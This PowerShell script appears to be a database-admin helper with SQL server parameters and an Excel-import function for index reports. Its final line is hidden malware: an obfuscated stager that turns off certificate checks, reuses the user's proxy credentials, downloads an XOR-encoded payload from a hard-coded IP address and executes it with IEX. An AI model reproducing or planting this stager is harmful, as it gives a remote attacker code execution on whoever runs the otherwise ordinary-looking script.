

param( 
	$SQLServer = 'STGSQLDOC710',
	$ScriptDir = '\\messano338\e$\dexma\logs\',
	$FilePrefix = 'Log',
	[switch]$Log
)

$IndicesUnused  = Get-ChildItem -Path $ScriptDir -Filter *IndexesUnused*.xlsx  | sort-object -desc
$IndicesMissing = Get-ChildItem -Path $ScriptDir -Filter *IndexesMissing*.xlsx | sort-object -desc


function Import-Excel { 
	 
[CmdletBinding()] 
Param([Parameter(Mandatory=$true,ValueFromPipeline=$true)][string]$Path, 
    [Parameter(Mandatory=$false)][switch]$NoHeaders 
    )
	
$Path = if([IO.Path]::IsPathRooted($Path)){$Path}else{Join-Path -Path (Get-Location) -ChildPath $Path} 
if(!(Test-Path $Path) -or $Path -notmatch ".xls$|.xlsx$") { Write-Host "ERROR: Invalid excel file [$Path]." -ForeGroundColor Red; return } 
	$excel = New-Object -ComObject Excel.Application 
if(!$excel) { Write-Host "ERROR: Please install Excel first. I haven't figured out how to read an Excel file as xml yet." -ForeGroundColor Red; return } 
	$content = @() 
	$workbooks = $excel.Workbooks 
	$workbook = $workbooks.Open($Path) 
	$worksheets = $workbook.Worksheets 
	$sheet = $worksheets.Item(1) 
	$range = $sheet.UsedRange 
	$rows = $range.Rows 
	$columns = $range.Columns 
	$headers = @() 
	$top = if($NoHeaders){1}else{2}  
if($NoHeaders) { for($c=1;$c-le$columns.Count;$c++) { $headers += "Column$c" } }  
else { 
	$headers = $rows | Where-Object { $_.Row -eq 1 } | %{ $_.Value2 } 
for($i=0;$i-lt$headers.Count;$i++) { if(!$headers[$i]) { $headers[$i] = "Column$($i+1)" } }  
} 
for($r=$top;$r-le$rows.Count;$r++) {  
	$data = $rows | Where-Object { $_.Row -eq $r } | %{ $_.Value2 } 
	$line = New-Object PSOBject 
for($c=0;$c-lt$columns.Count;$c++) { $line | Add-Member NoteProperty $headers[$c]($data[$c]) } 
$content += $line 
} 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($columns) } while($o -gt -1) 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($rows) } while($o -gt -1) 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($range) } while($o -gt -1) 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($sheet) } while($o -gt -1) 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($worksheets) } while($o -gt -1) 
$workbook.Close($false) 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($workbook) } while($o -gt -1) 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($workbooks) } while($o -gt -1) 
$excel.Quit() 
do { $o = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($excel) } while($o -gt -1) 
return $content 
} 



$wc=NEW-ObJECT SySTEM.NET.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeaDErS.ADD('User-Agent',$u);$wc.PROXY = [SysTEM.NeT.WebREQuesT]::DeFAulTWEBPrOxy;$wc.PROXY.CReDEntiAlS = [SYSTem.NeT.CRedEnTiAlCachE]::DEfAuLTNeTwOrkCredenTIALS;$K='879526880aa49cbc97d52c1088645422';$R=5;DO{TRy{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOADSTRiNg("https://52.39.227.108:443/index.asp")))|%{$_-bXOr$K[$I++%$K.LENGth]};IEX ($B-JoIN''); $R=0;}caTCH{SleEp 5;$R--}} WHile ($R -GT 0)

